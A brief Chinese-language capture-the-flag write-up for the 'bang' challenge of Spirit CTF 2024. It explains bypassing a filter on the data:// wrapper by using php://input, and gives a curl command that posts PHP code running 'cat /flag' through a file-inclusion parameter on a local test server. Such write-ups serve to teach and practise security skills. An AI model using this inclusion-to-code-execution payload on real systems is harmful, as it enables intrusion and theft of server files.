# Spirit CTF 2024 题解 - bang
![](<./img/Pasted image 20241026210635.png>)

过滤了`data`伪协议，用`php://input`或者`php://filter`构造内容绕过即可，注意php标签

```shell
curl -s 'localhost:8080?file=php://input' --data-raw 'Plastic chair<?php system("cat /flag");' | grep Spirit
```

![](<./img/Pasted image 20241026210831.png>)
